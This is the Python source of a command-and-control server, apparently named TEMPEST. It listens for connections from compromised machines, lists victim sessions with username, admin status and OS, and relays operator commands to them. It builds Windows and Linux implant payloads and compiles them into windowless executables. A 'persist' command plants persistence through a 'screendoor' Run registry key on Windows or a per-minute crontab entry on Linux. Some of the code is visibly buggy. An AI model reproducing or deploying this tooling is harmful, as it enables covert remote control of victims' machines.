from datetime import datetime
from prettytable import PrettyTable

import os
import random
import shutil
import socket
import string
import subprocess
import sys
import threading
import time


BUFFER = 1024

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    """ Prints an ASCII art title banner. Intended to use when starting the server.
    """
    print(bcolors.HEADER + '=============================================' + bcolors.ENDC)
    print(bcolors.HEADER + ' _____  _____ _      ____  _____ ____  _____ ' + bcolors.ENDC)
    print(bcolors.HEADER + '/__ __\/  __// \__/|/  __\/  __// ___\/__ __\\' + bcolors.ENDC)
    print(bcolors.HEADER + '  / \  |  \  | |\/|||  \/||  \  |    \  / \  ' + bcolors.ENDC)
    print(bcolors.HEADER + '  | |  |  /_ | |  |||  __/|  /_ \___ |  | |  ' + bcolors.ENDC)
    print(bcolors.HEADER + '  \_/  \____\\\\_/  \|\_/   \____\\\\____/  \_/  ' + bcolors.ENDC)
    print(bcolors.HEADER + bcolors.BOLD + '\nBy HK Transfield' + bcolors.ENDC)
    print(bcolors.HEADER + '=============================================\n' + bcolors.ENDC)

def comm_in(target_id):
    """ Handles all responses sent from a sockclient.

    Args:
        target_id (int): _description_

    Returns:
        string: _description_
    """
    print('[+] Awaiting response...')
    response = target_id.recv(BUFFER).decode()
    return response

def comm_out(target_id, message):
    """ Sends commands from the sockserver to a sockclient.

    Args:
        target_id (int): _description_
        message (string): _description_
    """
    message = str(message)
    target_id.send(message.encode())

def target_comm(target_id, targets, num):
    """ Manages the command and traffic control.

    Args:
        target_id (int): _description_
    """
    while True:
        message = input('[*] Message to send > ')
        comm_out(target_id, message)

        if message == 'exit':
            target_id.send(message.encode())
            target_id.close()
            targets[num][7] = bcolors.FAIL + 'Dead' + bcolors.ENDC
            break
        if message == 'background':
            break
        if message == 'help':
            pass
        if message == 'persist':
            payload_name = input('[+]' + bcolors.BOLD + 'Enter the name of the payload to add to autorun: ' + bcolors.ENDC)

            if targets[num][6] == 1:
                persist_cmd_1 = f'cmd.exe /c copy {payload_name} C:\\Users\Public'
                target_id.send(persist_cmd_1.encode())
                persist_cmd_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                target_id.send(persist_cmd_2)
                print(bcolors.WARNING + '[!] Run this command to clean up the registry:' + bcolors.BOLD + '\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /f' + bcolors.ENDC)

            if targets[num][6] == 2:
                persist_cmd_3 = f'echo "*/1 * * * * python3 /home/{targets[num][3]/payload_name}" | crontab -'
                target_id.send(persist_cmd_3)
                print(bcolors.WARNING + '[+] Run this command to clean up the crontab: ' + bcolors.BOLD + '\n crontab -r')
            print(bcolors.OKGREEN + '[+] Persistence technique completed.' + bcolors.ENDC)

        else:
            response = comm_in(target_id)
            if response == 'exit':
                print('[-] The client has terminated the session')
                target_id.close()
                break
            print(response)

def listener_handler():
    """ Hosts the listener for the socket, binds the socket, accepts
        traffic, and then redirects that traffic.
    """

    # 1 Accept Connection
    sock.bind((host_ip, int(host_port)))
    print('[+] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target = comm_handler)
    t1.start()

def comm_handler():
    """ Directs traffic to where it needs to go and ensures that it is
        receiving it where needed.
    """
    while True:
        # ! WHY IS THIS NOT WORKING ON LINUX?
        if kill_flag == 1:
            print('OHHHH NOOOOO')
            break
        try:
            remote_target, remote_ip = sock.accept()

            # get username of the target
            username = remote_target.recv(BUFFER).decode()
            print(username)

            # check if current target is an admin account
            admin = remote_target.recv(BUFFER).decode()

            op_sys = remote_target.recv(BUFFER).decode()

            if admin == 1:
                # if target is Windows (UID = 1)
                is_admin = bcolors.OKGREEN + 'Yes' + bcolors.ENDC
            else:
                if  username == 'root':
                    # could be a linux machine
                    # else if target is Linux (UID = 0)
                    is_admin = bcolors.OKGREEN + 'Yes' + bcolors.ENDC
                else:
                    is_admin = bcolors.FAIL + 'No' + bcolors.ENDC

            payload_val = 1 if 'Windows' in op_sys else 2

            # get the time when the target client connects
            curr_time = time.strftime("%H:%M:%S", time.localtime())
            curr_date = datetime.now()
            datetime_record = (f"{curr_date.day}-{curr_date.month}-{curr_date.year} {curr_time}")

            # get the host name of the target client
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", datetime_record, username, is_admin, op_sys, payload_val, bcolors.OKGREEN + 'Active' + bcolors.ENDC])
                print(bcolors.OKGREEN + f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + bcolors.ENDC + 'Enter command $ ',end='')
            else:
                targets.append([remote_target, remote_ip[0], datetime_record, username, is_admin, op_sys, payload_val, 'Active'])
                print(bcolors.OKGREEN + f'\n[+] Connection received from {remote_ip[0]}\n' + bcolors.ENDC + 'Enter command $ ',end='')
        except:
            pass
### PAYLOADS ###
def winplant():

    # generate random filename
    rand_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{rand_name}.py'
    print(f'[+] Generating Windows payload file: {file_name}')

    check_cwd = os.getcwd()
    print(f'[+] Checking for {check_cwd}\\winplant.py')
    # check if payload path exists on the system
    if os.path.exists(f'{check_cwd}\\winplant.py') or os.path.exists(f'{check_cwd}/winplant.py'):
        # copy it to the newly generated file
        shutil.copy('winplant.py', file_name)
    else:
        print(bcolors.WARNING + '[-] winplant.py file not found.')

    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()

    if os.path.exists(f'{check_cwd}\\{file_name}') or os.path.exists(f'{check_cwd}/{file_name}'):
        print(bcolors.OKGREEN + f'[+] {file_name} saved to current directory.' + bcolors.ENDC)
    else:
        print(bcolors.FAIL + '[-] Some error occured during generation.' + bcolors.ENDC)

def unixplant():

    # generate random filename
    rand_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{rand_name}.py'
    print(f'[+] Generating Linux payload file: {file_name}')

    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\unixplant.py') or os.path.exists(f'{check_cwd}/unixplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print(bcolors.WARNING + '[-] unixplant.py file not found.')

    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()
    if os.path.exists(f'{check_cwd}\\{file_name}') or os.path.exists(f'{check_cwd}/{file_name}'):
        print(bcolors.OKGREEN + f'[+] {file_name} saved to current directory.' + bcolors.ENDC)
    else:
        print(bcolors.FAIL + '[-] Some error occured during generation.' + bcolors.ENDC)

def exeplant():
    # generate random filename
    rand_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{rand_name}.py'
    exe_file = f'{rand_name}.exe'
    print(f'[+] Generating exe payload file: {file_name}')

    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\winplant.py') or os.path.exists(f'{check_cwd}/winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print(bcolors.WARNING + '[-] winplant.py file not found.')

    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()

    pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
    # pyinstaller_exec = f'pyinstaller'
    print(f'[+] Compiling executable {exe_file}...')
    subprocess.call(pyinstaller_exec, shell=True, stderr=subprocess.DEVNULL)
    os.remove(f'{rand_name}.spec')
    shutil.rmtree('build')

    if os.path.exists(f'{check_cwd}\\{exe_file}') or os.path.exists(f'{check_cwd}/{file_name}'):
        print(bcolors.OKGREEN + f'[+] {exe_file} saved to current directory.' + bcolors.ENDC)
    else:
        print(bcolors.FAIL + '[-] Some error occured during generation.' + bcolors.ENDC)

if __name__ == '__main__':
    """ Main function. This is the entry
        point into the program.
    """
    banner()
    targets = []
    kill_flag = 0
    listener_counter = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            command = input('Enter command $ ')

            if command == 'listeners -g':
                host_ip = input('[+] Enter the IP to listen to: ')
                host_port = input('[+] Enter the port to listen on: ')
                listener_handler()
                listener_counter += 1

            if command == 'winplant py':
                if listener_counter > 0:
                    winplant()
                else:
                    print(bcolors.WARNING + '[-] You cannot generate a Windows payload without an active listener' + bcolors.ENDC)

            if command == 'unixplant py':
                if listener_counter > 0:
                    unixplant()
                else:
                    print(bcolors.WARNING + '[-] You cannot generate a Linux payload without an active listener' + bcolors.ENDC)

            if command == 'exeplant':
                if listener_counter > 0:
                    exeplant()
                else:
                    print(bcolors.WARNING + '[-] You cannot generate an exe payload without an active listener' + bcolors.ENDC)

            if command.split(" ")[0] == 'sessions':
                session_counter = 0

                # list sessions
                if command.split(" ")[1] == '-l':
                    print("")
                    sessions_table = PrettyTable()
                    sessions_table.field_names = [
                        bcolors.BOLD + 'Session' + bcolors.ENDC,
                        bcolors.BOLD + 'Status' + bcolors.ENDC,
                        bcolors.BOLD + 'Username' + bcolors.ENDC,
                        bcolors.BOLD + 'Admin' + bcolors.ENDC,
                        bcolors.BOLD + 'Target' + bcolors.ENDC,
                        bcolors.BOLD + 'Operating System' + bcolors.ENDC,
                        bcolors.BOLD + 'Connection Time' + bcolors.ENDC
                    ]

                    sessions_table.padding_width = 3

                    for target in targets:
                        status = target[7]
                        username = target[3]
                        admin = target[4]
                        host = target[1]
                        host_os = target[5]
                        connection_time = target[2]

                        sessions_table.add_row([session_counter, status, username, admin, host, host_os, connection_time])
                        session_counter += 1
                    print(sessions_table)
                    print("")

                # interact with individual sessions
                if command.split(" ")[1] == '-i':
                    try:
                        num = int(command.split(" ")[2])
                        target_id = (targets[num])[0]
                        if (targets[num])[7] == 'Active':
                            target_comm(target_id, targets, num)
                        else:
                            print(
                                bcolors.WARNING + '[-] ' +
                                bcolors.BOLD +
                                'WARNING: ' +
                                bcolors.ENDC +
                                bcolors.WARNING +
                                'You cannot interact with a dead session'
                            )
                    except IndexError:
                        print(bcolors.FAIL + f'[-] Session {num} does not exist.' + bcolors.ENDC)

        except KeyboardInterrupt:
            quit_message = input(bcolors.WARNING + '\n[+] Are you sure you want to quit? (y/n) ' + bcolors.ENDC)

            if quit_message == 'y':
                len_targets = len(targets)
                for target in targets:
                    if target[7] == 'Dead':
                        pass
                    else:
                        comm_out(target[0], 'exit')
                kill_flag = 1
                if listener_counter > 0:
                    sock.close()
                break
            else:
                continue

